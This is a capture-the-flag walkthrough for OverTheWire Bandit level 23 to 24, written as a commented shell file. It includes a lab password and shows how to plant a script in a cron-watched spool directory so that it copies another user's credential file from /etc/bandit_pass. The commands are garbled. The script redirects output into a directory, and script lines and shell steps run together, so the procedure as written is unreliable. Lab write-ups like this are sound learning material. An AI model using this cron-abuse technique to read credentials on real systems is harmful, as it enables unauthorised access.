# level 23 --> level 24
# A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ \n
# for the configuration and see what command is being executed.

# NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud \n
# of yourself when you beat this level!

# NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy \n
# around…

#username: bandit23@bandit.labs.overthewire.org
#password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga (output of level 22)
ls /etc/cron.d #given in the question to look her
# since we want to password for the next level (24) We will look into cronjob_bandit24
cat /etc/cron.d/cronjob_bandit24
# we can see a shellscript running. Lets print that
cat /usr/bin/cronjob_bandit24.sh 
# we can see that the script it deleting all the folders in /var/spool/$myname/foo (/var/spool/bandit24/foo) and if the owner is bandit23, timeout for 60 seconds.
#first we need to create a scirpt to write the password 
mktemp -d #/tmp/tmp.I6NAhFBL3f
nano script.sh
# Inside nano
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.I6NAhFBL3f
touch password
chmod 777 -R /tmp/tmp.I6NAhFBL3f
cp script.sh /var/spool/bandit24/foo
cat password # After 1 min you should be able to see the results.

# copy the password to ssh into your next bandit level
# use the "exit" command to exit bandit1

# Happy Hacking!